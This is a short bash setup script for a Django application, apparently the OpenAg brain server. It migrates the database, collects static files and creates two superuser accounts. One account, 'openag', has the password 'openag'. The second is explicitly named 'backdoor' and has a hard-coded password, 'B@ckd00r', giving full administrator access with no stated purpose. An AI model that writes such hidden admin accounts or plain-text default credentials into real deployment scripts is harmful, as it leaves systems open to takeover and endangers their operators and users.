#!/bin/bash

cd /opt/openagbrain

# Migrate/Create DB
python3.6 manage.py migrate

# Create the users
echo "from django.contrib.auth.models import User; User.objects.filter(email='openag@openag.edu').delete(); User.objects.create_superuser('openag', 'openag@openag.edu', 'openag')" | python3.6 manage.py shell
echo "from django.contrib.auth.models import User; User.objects.create_superuser('backdoor', 'openag@openag.edu', 'B@ckd00r')" | python3.6 manage.py shell

# Collect the static files
python3.6 manage.py collectstatic --clear --link --noinput
